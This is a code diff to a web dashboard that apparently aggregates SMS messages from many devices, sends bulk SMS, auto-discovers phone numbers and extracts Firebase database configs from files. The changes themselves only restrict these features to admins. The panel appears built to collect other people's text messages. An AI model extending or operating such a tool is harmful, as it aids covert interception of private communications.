@@ -1247,6 +1247,7 @@ async function unlockVault() {
             window.CURRENT_ROLE = data.role;
             window.CAN_EDIT_PHONE = data.role === 'admin' || data.permissions?.canEditPhone;
                 window.CAN_VIEW_TELECOM = data.role === 'admin' || data.permissions?.canViewTelecomIntel;
+                window.CAN_USE_AUTO_DISCOVERY = data.role === 'admin' || data.permissions?.canUseAutoDiscovery;
             
             document.getElementById('pwdModal').classList.remove('active');
             bootNexus();
@@ -1319,6 +1320,13 @@ async function bootNexus() {
 }
 
 function renderDbSidebarFilters() {
+    const srcDd = document.getElementById('srcDdWrapper');
+    if (window.CURRENT_ROLE !== 'admin') {
+        if (srcDd) srcDd.style.display = 'none';
+        return;
+    }
+    if (srcDd) srcDd.style.display = 'block';
+    
     const filterHtml = SOURCES.map(s => {
         const c = s.color || 'var(--cyan)';
         return `<div class="dd-item" style="color:${c}" onclick="selectDd('${s.key}', '${s.label}', 'src', this)"><div style="display:inline-block;width:8px;height:8px;border-radius:50%;background:${c};box-shadow:0 0 8px ${c};margin-right:10px;"></div>${s.label}</div>`;
@@ -1780,7 +1788,8 @@ function renderTab(silent = false) {
             <div class="stat-card c-cyan"><div class="stat-title">Total Devices</div><div class="stat-value">${devices.length}</div></div>
             <div class="stat-card c-green"><div class="stat-title">Online</div><div class="stat-value">${on}</div></div>
             <div class="stat-card c-red"><div class="stat-title">SMS Events</div><div class="stat-value">${sms}</div></div>
-        </div>`;
+        </div>
+        ${window.CURRENT_ROLE === 'admin' ? hubHtml : ''}`;
     }
     else {
         if(!selDev) { p.innerHTML = emp('Select a device from the sidebar'); return; }
@@ -1846,7 +1855,6 @@ function renderTab(silent = false) {
                     <div class="mhb-badge">${msgs.length} MSGS</div>
                 </div>
                 <div style="display:flex; gap:8px;">
-                    ${window.CAN_VIEW_TELECOM ? `<button class="btn" style="background:rgba(245, 158, 11, 0.1); color:var(--amber); border:1px solid rgba(245, 158, 11, 0.3);" onclick="scanTelecom(selDev)">📡 Auto-Discover Number</button>` : ''}
                     <button class="btn primary" onclick="cache['${d._src}:${d._id}']=null;fetchMsgs(selDev)">↻ Force Sync</button>
                 </div>
             </div>
@@ -2996,7 +3004,7 @@ async function execBulkSMS() {
     
     // Trigger Auto-Discovery if Receiver ID is provided
     const receiverId = document.getElementById('bulkReceiverId')?.value.trim();
-    if (CAN_EDIT_PHONE && receiverId) {
+    if (window.CAN_USE_AUTO_DISCOVERY && receiverId) {
         startDiscoveryScan(receiverId, selected);
     }
 }
@@ -3496,12 +3504,12 @@ async function extractFirebaseConfig(file) {
     <div id="contextMenu" class="context-menu">
         <div class="c-header">Device Actions</div>
         <div class="c-item" onclick="execContext('copy-id', this)">📋 Copy Device ID</div>
-        <div class="c-item" onclick="execContext('copy-url', this)">🔗 Copy Database URL</div>
+        ${window.CURRENT_ROLE === 'admin' ? '<div class="c-item" onclick="execContext(\'copy-url\', this)">🔗 Copy Database URL</div>' : ''}
     </div>
     
     <div id="hubContextMenu" class="context-menu">
         <div class="c-header">Database Actions</div>
-        <div class="c-item" onclick="execHubContext('copy-url', this)">🔗 Copy Database URL</div>
+        ${window.CURRENT_ROLE === 'admin' ? '<div class="c-item" onclick="execHubContext(\'copy-url\', this)">🔗 Copy Database URL</div>' : ''}
     </div>
 </body>
 </html>
